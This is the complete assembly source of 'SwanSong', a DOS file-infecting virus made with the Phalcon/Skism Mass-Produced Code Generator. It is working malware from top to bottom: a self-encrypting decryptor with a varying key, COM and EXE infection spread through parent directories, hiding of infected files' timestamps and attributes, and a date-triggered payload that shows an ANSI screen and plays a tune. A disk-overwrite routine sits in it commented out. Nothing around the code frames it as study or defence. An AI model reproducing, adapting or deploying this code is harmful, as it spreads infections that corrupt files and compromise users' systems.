﻿

; ZEP1.ASM : [SwanSong] by [pAgE]
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file skeleton.cfg

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

id = 'ZP'                               ; ID word for EXE infections
entry_point: db 0e9h,0,0                ; jmp decrypt

decrypt:                                ; handles encryption and decryption
          mov  di,(offset heap - offset startencrypt)/2 ; iterations
patch_startencrypt:
          mov  bp,offset startencrypt   ; start of decryption
decrypt_loop:
          db   2eh,81h,46h,0            ; add word ptr cs:[bp], xxxx
decrypt_value dw 0                      ; initialised at zero for null effect
          inc  bp                       ; calculate new decryption location
          inc  bp
          dec  di                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          cmp  sp,id                    ; COM or EXE?
          je   restoreEXE
restoreCOM:
          lea  si,[bp+save3]
          mov  di,100h
          push di                       ; For later return
          movsb
          jmp  short restoreEXIT
restoreEXE:
          push ds
          push es
          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          lea  si,[bp+jmpsave2]
          lea  di,[bp+jmpsave]
          movsw
          movsw
          movsw
restoreEXIT:
          movsw

          mov  byte ptr [bp+numinfec],9 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
          int  21h

          mov  ah,47h                   ; Get current directory
          mov  dl,0                     ; Current drive
          lea  si,[bp+origdir]          ; DS:SI->buffer
          int  21h
          mov  byte ptr [bp+backslash],'\' ; Prepare for later CHDIR

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+exe_mask]
          call infect_mask
          lea  dx,[bp+com_mask]
          call infect_mask
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+dot_dot]          ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
          mov  ah,2ah                   ; Get current date
          int  21h
          cmp  dh,1                     ; Check month
          jb   exit_virus
          cmp  cx,1992                  ; Check year
          jb   exit_virus
          cmp  al,0                     ; Check date of week
          jae  activate

exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,3bh                   ; change directory
          lea  dx,[bp+origdir-1]        ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          cmp  sp,id-4                  ; EXE or COM?
          jz   returnEXE
returnCOM:
          int  27h                      ; YEAH!  Memory Resident
          NOP                           ; Change it to 21h instead!
          retn
returnEXE:
          pop  es
          pop  ds
          int  21h
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+jmpsave+2],ax
          add  ax,word ptr cs:[bp+stacksave+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+stacksave]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
jmpsave             dd ?                ; Original CS:IP
stacksave           dd ?                ; Original SS:SP
jmpsave2            db ?                ; Actually four bytes
save3               db 0cdh,20h,0       ; First 3 bytes of COM file
stacksave2          dd ?

activate        proc    far

start:
		jmp	short loc_1
		db	90h
data_2		db	0
data_3		dw	23Fh
		db	2
data_4		dw	0
		db	'TheDraw COM file Screen Save'
		db	1Ah
data_5		db	'Unsupported Video Mode', 0Dh, 0Ah
		db	'$'
loc_1:
                mov  ah,0Fh
                int  010h
                xor  ah,ah
                int  010h
                mov  ax,0002h
                mov  cx,0100h
		mov	ah,0Fh
		int	10h			; Video display   ah=functn 0Fh
		mov	bx,0B800h
		cmp	al,2
		je	loc_2			; Jump if equal
		cmp	al,3
		je	loc_2			; Jump if equal
		mov	data_2,0
		mov	bx,0B000h
		cmp	al,7
		je	loc_2			; Jump if equal
		mov	dx,offset data_5	; ('Unsupported Video Mode')
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		retn
loc_2:
		mov	es,bx
		mov	di,data_4
		mov	si,offset data_6
		mov	dx,3DAh
		mov	bl,9
		mov	cx,data_3
		cld				; Clear direction
		xor	ax,ax			; Zero register

locloop_4:
		lodsb				; String [si] to al
		cmp	al,1Bh
		jne	loc_5			; Jump if not equal
		xor	ah,80h
		jmp	short loc_20
loc_5:
		cmp	al,10h
		jae	loc_8			; Jump if above or =
		and	ah,0F0h
		or	ah,al
		jmp	short loc_20
loc_8:
		cmp	al,18h
		je	loc_11			; Jump if equal
		jnc	loc_12			; Jump if carry=0
		sub	al,10h
		add	al,al
		add	al,al
		add	al,al
		add	al,al
		and	ah,8Fh
		or	ah,al
		jmp	short loc_20
loc_11:
		mov	di,data_4
		add	di,data_1e
		mov	data_4,di
		jmp	short loc_20
loc_12:
		mov	bp,cx
		mov	cx,1
		cmp	al,19h
		jne	loc_13			; Jump if not equal
		lodsb				; String [si] to al
		mov	cl,al
		mov	al,20h			; ' '
		dec	bp
		jmp	short loc_14
loc_13:
		cmp	al,1Ah
		jne	loc_15			; Jump if not equal
		lodsb				; String [si] to al
		dec	bp
		mov	cl,al
		lodsb				; String [si] to al
		dec	bp
loc_14:
		inc	cx
loc_15:
		cmp	data_2,0
		je	loc_18			; Jump if equal
		mov	bh,al

locloop_16:
		in	al,dx			; port 3DAh, CGA/EGA vid status
		rcr	al,1			; Rotate thru carry
		jc	locloop_16		; Jump if carry Set
loc_17:
		in	al,dx			; port 3DAh, CGA/EGA vid status
		and	al,bl
		jnz	loc_17			; Jump if not zero
		mov	al,bh
		stosw				; Store ax to es:[di]
		loop	locloop_16		; Loop if cx > 0

		jmp	short loc_19
loc_18:
		rep	stosw			; Rep when cx >0 Store ax to es:[di]
loc_19:
		mov	cx,bp
loc_20:
		jcxz	loc_ret_21		; Jump if cx=0
		loop	locloop_4		; Loop if cx > 0


loc_ret_21:


                mov     si,offset data00        ; SI points to data
get_note:       mov     bx,[si]                 ; Load BX with the frequency
                or      bx,bx                   ; Is BX equal to zero?
                je      play_tune_done          ; If it is we are finished

                mov     ax,034DDh               ;
                mov     dx,0012h                ;
                cmp     dx,bx                   ;
                jnb     new_note                ;
                div     bx                      ; This bit here was stolen
                mov     bx,ax                   ; from the Turbo C++ v1.0
                in      al,061h                 ; library file CS.LIB.  I
                test    al,3                    ; extracted sound() from the
                jne     skip_an_or              ; library and linked it to
                or      al,3                    ; an .EXE file, then diassembled
                out     061h,al                 ; it.  Basically this turns
                mov     al,0B6h                 ; on the speaker at a certain
                out     043h,al                 ; frequency.
skip_an_or:     mov     al,bl                   ;
                out     042h,al                 ;
                mov     al,bh                   ;
                out     042h,al                 ;

                mov     bx,[si + 2]             ; BX holds duration value
                xor     ah,ah                   ; BIOS get time function
                int     1Ah
                add     bx,dx                   ; Add the time to the length
wait_loop:      int     1Ah                     ; Get the time again (AH = 0)
                cmp     dx,bx                   ; Is the delay over?
                jne     wait_loop               ; Repeat until it is
                in      al,061h                 ; Stolen from the nosound()
                and     al,0FCh                 ; procedure in Turbo C++ v1.0.
                out     061h,al                 ; This turns off the speaker.

new_note:       add     si,4                    ; SI points to next note
                jmp     short get_note          ; Repeat with the next note
play_tune_done:
               ;mov     ax,0002h                ; Which Drive???
               ;mov     cx,0100h                ; How many sectors to NUKE?
               ;cli                             ; Disable interrupts (no Ctrl-C)
               ;cwd                             ; Clear DX (start with sector 0)
               ;int     026h                    ; Ahhhh!  WAD...pfffft!
               ;sti                             ; Res.interrupts what's left
               ;mov     ax,04C00h               ; DOS term.func.
               ;int     021h
activate        endp

          jmp  exit_virus

creator             db '[MPC]',0        ; Mass Produced Code Generator
virusname           db '[SwanSong]',0
author              db '[pAgE]',0

infect_mask:
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   exit_infect_mask         ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          cmp  word ptr [bp+buffer],'ZM'; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          mov  bx,word ptr [bp+buffer+1]; get jmp location
          add  bx,heap-decrypt+3        ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
          jnz  infect_exe
find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
exit_infect_mask: ret

infect_exe:
          les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
          mov  word ptr [bp+jmpsave2], ax
          mov  word ptr [bp+jmpsave2+2], es

          les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
          mov  word ptr [bp+stacksave2], es
          mov  word ptr [bp+stacksave2+2], ax

          mov  ax, word ptr [bp+buffer + 8] ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax, [bp+offset newDTA+26]; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr [bp+buffer+14h], dx ; New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ; and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ; get file length
          pop  ax

          add  ax, heap-decrypt         ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr [bp+buffer+4], dx ; new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ; restore ES
          pop  es

          push word ptr [bp+buffer+14h] ; needed later
          mov  cx, 1ah
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
          push ax                       ; needed later
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+code_store]
          mov  ax,5355h                 ; push bp,push bx
          stosw
          lea  si,[bp+decrypt]          ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          xor  byte ptr [bp+decrypt_loop+2],028h ; flip between add/sub

          lea    si,[bp+write]          ; Copy writing function
          mov    cx,endwrite-write      ; Bytes to move
          rep    movsb
          pop    cx
          pop    si
          pop    dx                     ; Entry point of virus
          push   di
          push   si
          push   cx
          rep    movsb                  ; Copy decryption function
          mov    ax,5b5dh               ; pop bx,pop bp
          stosw
          mov    al,0c3h                ; retn
          stosb

          add    dx,offset startencrypt - offset decrypt ; Calculate new
          mov    word ptr [bp+patch_startencrypt+1],dx ; starting offset of
          call   code_store             ; decryption
          pop    cx
          pop    di
          pop    si
          rep    movsb                  ; Restore decryption function

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          pop  ax                       ; remove call from stack
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

write:
          pop  bx                       ; Restore file handle
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+decrypt]          ; Concatenate virus
          mov  cx,heap-decrypt          ; # bytes to write
          int  21h
          push bx
          push bp
endwrite:

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control
data00    dw      2000,8,2500,8,2000,14,2500,14
         dw      2500,14,3000,4,4000,24,3500,12,4000,6
         dw      3500,12,4000,4,4500,10,5000,4
         dw      5500,15,3000,8,3500,20,3000,8,3500,50
         dw      2000,8,2500,8,2000,14,2500,14
         dw      2500,14,3000,4,4000,24,3500,12,4000,6
         dw      3500,12,4000,4,4500,10,5000,4
         dw      5500,15,3000,8,3500,20,3000,8,3500,50
         dw      2000,8,2500,8,2000,14,2500,14
         dw      2500,14,3000,4,4000,24,3500,12,4000,6
         dw      3500,12,4000,4,4500,10,5000,4
         dw      5500,15,3000,8,3500,20,3000,8,3500,50
         dw      0
data_6		db	2
		db	10h
		db	'I', 27h, 'll never leave you alo'
		db	'ne because, I', 27h, 'm ...'
		db	 19h, 1Dh, 18h, 19h, 48h, 18h
		db	 19h, 48h, 18h, 19h, 0Eh, 04h
		db	0D6h,0C4h,0D2h,0C4h,0BFh, 20h
		db	0D2h, 20h, 20h,0C2h, 20h,0D2h
		db	0C4h,0C4h,0BFh, 19h, 2Ah, 18h
		db	 19h, 10h, 0Bh,0BAh, 19h, 02h
		db	0C7h,0C4h,0C4h,0B4h, 20h,0C7h
		db	0C4h, 19h, 2Ch, 18h, 19h, 10h
		db	 09h,0D0h, 19h, 02h,0D0h, 20h
		db	 20h,0C1h, 20h,0D0h,0C4h,0C4h
		db	0D9h, 19h, 2Ah, 18h, 19h, 0Eh
		db	 04h,0D6h,0C4h,0D2h,0C4h,0BFh
		db	 20h,0D6h,0C4h,0C4h,0BFh, 20h
		db	0D2h,0C4h,0C4h,0BFh, 20h,0D2h
		db	 20h,0DAh, 19h, 26h, 18h, 19h
		db	 0Eh, 0Bh,0BAh, 20h,0BAh, 20h
		db	0B3h, 20h,0C7h,0C4h,0C4h,0B4h
		db	 20h,0C7h,0C4h,0C2h,0D9h, 20h
		db	0C7h,0C4h,0C1h,0BFh, 19h, 25h
		db	 18h, 19h, 0Eh, 09h,0D0h, 20h
		db	0D0h, 20h,0C1h, 20h,0D0h, 20h
		db	 20h,0C1h, 20h,0D0h, 20h,0C1h
		db	 20h, 20h,0D0h, 20h, 20h,0C1h
		db	 19h, 25h, 18h, 19h, 0Eh, 04h
		db	0D2h, 20h,0D2h, 20h,0C2h, 20h
		db	0D2h, 20h, 20h,0C2h, 20h,0C4h
		db	0D2h,0C4h, 20h,0D6h,0C4h,0D2h
		db	0C4h,0BFh, 20h,0D6h,0C4h,0D2h
		db	0C4h,0BFh, 20h,0C4h,0D2h,0C4h
		db	 20h,0D6h,0C4h,0C4h,0BFh, 20h
		db	0D6h,0C4h,0C4h,0BFh, 20h,0D6h
		db	0C4h,0D2h,0C4h,0BFh, 20h,0D6h
		db	0C4h,0C4h,0BFh, 20h,0D6h,0C4h
		db	0C4h,0BFh, 20h, 20h, 18h, 19h
		db	 0Eh, 0Bh,0BAh, 20h,0BAh, 20h
		db	0B3h, 20h,0C7h,0C4h,0C4h,0B4h
		db	 20h, 20h,0BAh, 19h, 03h,0BAh
		db	 19h, 04h,0BAh, 19h, 03h,0BAh
		db	 20h, 20h,0BAh, 20h, 20h,0B3h
		db	 20h,0BAh, 20h,0C4h,0BFh, 19h
		db	 02h,0BAh, 19h, 02h,0BAh, 20h
		db	 20h,0B3h, 20h,0BAh
		db	 20h, 20h
		dd	182020B3h		; Data table (indexed access)
		db	 19h, 0Eh, 09h,0D3h,0C4h,0D0h
		db	0C4h,0D9h, 20h,0D0h, 20h, 20h
		db	0C1h, 20h,0C4h,0D0h,0C4h, 19h
		db	 02h,0D0h, 19h, 04h,0D0h, 19h
		db	 02h,0C4h,0D0h,0C4h, 20h,0D0h
		db	 20h, 20h,0C1h, 20h,0D3h,0C4h
		db	0C4h,0D9h, 19h, 02h,0D0h, 19h
		db	 02h,0D3h,0C4h,0C4h,0D9h, 20h
		db	0D0h, 20h, 20h,0C1h, 20h, 20h
		db	 18h, 19h, 0Eh, 0Eh, 1Bh,0D2h
		db	 19h, 04h,0C2h, 20h,0C4h,0C4h
		db	0D2h,0C4h,0C4h, 20h,0D2h, 1Ah
		db	 04h,0C4h,0BFh, 20h,0D2h, 19h
		db	 04h,0C2h, 20h,0D6h, 1Ah, 04h
		db	0C4h,0BFh, 19h, 03h, 04h, 1Bh
		db	0D2h, 20h,0D2h, 20h,0D2h, 20h
		db	0D2h, 20h,0D2h, 20h,0D2h, 20h
		db	0D2h, 20h,0D2h, 20h, 20h, 18h
		db	 19h, 0Eh, 0Eh, 1Bh,0BAh, 19h
		db	 04h,0B3h, 19h, 02h,0BAh, 19h
		db	 02h,0BAh, 19h, 04h,0B3h, 20h
		db	0BAh, 19h, 04h,0B3h, 20h,0BAh
		db	 19h, 09h, 0Bh, 1Bh,0BAh, 20h
		db	0BAh, 20h,0BAh, 20h,0BAh, 20h
		db	0BAh, 20h,0BAh, 20h,0BAh, 20h
		db	0BAh, 20h, 20h, 18h, 19h, 0Eh
		db	 0Eh, 1Bh,0D3h,0B7h, 19h, 02h
		db	0DAh,0D9h, 19h, 02h,0BAh, 19h
		db	 02h,0C7h,0C4h,0C4h,0C4h,0C2h
		db	0C4h,0D9h, 20h,0BAh, 19h, 04h
		db	0B3h, 20h,0D3h, 1Ah, 04h,0C4h
		db	0BFh, 19h, 03h
		db	9, 1Bh, 'o o o o o o o o  '
		db	 18h, 19h, 0Fh, 0Eh, 1Bh,0BAh
		db	 19h, 02h,0B3h, 19h, 03h,0BAh
		db	 19h, 02h,0BAh, 19h, 02h,0B3h
		db	 19h, 02h,0BAh, 19h, 04h,0B3h
		db	 19h, 06h,0B3h, 19h, 14h, 18h
		db	 19h, 0Fh,0D3h,0C4h,0C4h,0C4h
		db	0D9h, 20h, 20h,0C4h,0C4h,0D0h
		db	0C4h,0C4h, 20h,0D0h, 19h, 02h
		db	0C1h,0C4h, 20h, 20h,0D3h, 1Ah
		db	 04h,0C4h,0D9h, 20h,0D3h, 1Ah
		db	 04h,0C4h,0D9h, 19h, 14h, 18h


data_1e             equ     0A0h
exe_mask            db '*.exe',0
com_mask            db '*.com',0
dot_dot             db '..',0
heap:                                   ; Variables not in code
; The following code is the buffer for the write function
code_store:         db (startencrypt-decrypt)*2+(endwrite-write)+1 dup (?)
oldint24            dd ?                ; Storage for old int 24h handler      
backslash           db ?
origdir             db 64 dup (?)       ; Current directory buffer             
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
end       entry_point
